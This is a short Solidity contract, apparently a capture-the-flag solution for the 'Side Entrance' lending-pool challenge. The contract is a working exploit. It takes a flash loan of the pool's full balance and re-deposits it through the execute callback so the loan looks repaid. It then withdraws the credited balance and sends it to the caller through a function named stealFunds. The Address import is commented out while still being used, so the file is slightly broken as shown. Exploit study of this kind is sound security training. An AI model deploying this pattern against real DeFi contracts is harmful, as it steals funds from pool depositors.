pragma solidity ^0.6.0;

//import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external ;
}

contract SideEntranceAttacker {
    using Address for address payable;

    ISideEntranceLenderPool mainPool;

    function  stealFunds(ISideEntranceLenderPool _mainPoolAddress) external{
        mainPool = _mainPoolAddress;
        mainPool.flashLoan(address(mainPool).balance);
        mainPool.withdraw();
        msg.sender.sendValue(address(this).balance);

    }
    
    function execute() external payable{
        mainPool.deposit{value:msg.value}();
    }

    receive() external payable{}
}
 
